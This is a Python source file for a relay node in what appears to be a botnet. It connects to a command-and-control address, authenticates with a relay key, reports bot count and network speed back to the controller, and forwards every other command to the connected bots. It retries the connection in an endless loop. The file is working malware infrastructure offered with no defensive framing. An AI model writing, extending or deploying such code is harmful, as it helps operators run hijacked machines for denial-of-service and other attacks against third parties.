import time
from socket import socket as Sock
from socket import SOL_SOCKET, SO_KEEPALIVE, AF_INET, SOCK_STREAM
from .config import RelayConfig

class Relay():
    def __init__(
        self, 
        config: RelayConfig = RelayConfig()
    ) -> None:
        self.config = config

    def log(
        self,
        data: str,
    ) -> None: 
        if self.config.debug: print(data)

    def send(
        self,
        s: Sock,
        data: str,
        escape=True,
        reset=True,
    ) -> None:
        if reset: data += self.config.COLOR_RESET
        if escape: data += '\r\n'

        s.send(data.encode())

    def broadcast(
        self,
        data: str,
    ) -> None:
        self.log(f"send {data}")

        for relay in self.config.relay_list:
            try: self.send(relay, f'{data}', False, False)
            except Exception:
                self.config.relay_list.pop(relay)
                relay.close()

    def relay(self):
        c2: Sock = Sock(AF_INET, SOCK_STREAM)
        c2.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)

        self.log("relay starting...")
        while 1:
            try:
                c2.connect(self.config.cnc_addr.CNC_ADDR)
                self.log("relay online")

                while 1:
                    data: str = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send(f'RELAY[p:{self.config.RELAY_KEY}]'.encode())
                        break

                while 1:
                    data: str = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send(f'{self.config.RELAY_KEY}'.encode())
                        break

                break
            except Exception:
                self.log("relay offline, retry later")
                time.sleep(self.config.relay_time.RELAY)

        while 1:
            try:
                data: str = c2.recv(1024).decode()

                if not data: break

                self.log(data)

                args: list[str] = data.split(' ')
                command: str = args[0].upper()

                match command:
                    case 'RPING':
                        self.log("rping")
                        c2.send(f'RPONG[p:{self.config.RELAY_KEY}]'.encode())

                    case 'RNETSPEED':
                        self.log("rnetspeed")
                        c2.send(f"{round(sum(self.config.speed))}".encode())

                    case 'RNETBOTS':
                        self.log("rnetbots")
                        c2.send(f"{len(self.config.bots)}".encode())

                    case _:
                        self.broadcast(data)

            except Exception: break

        c2.close()
        time.sleep(self.config.relay_time.RELAY)
        self.relay()
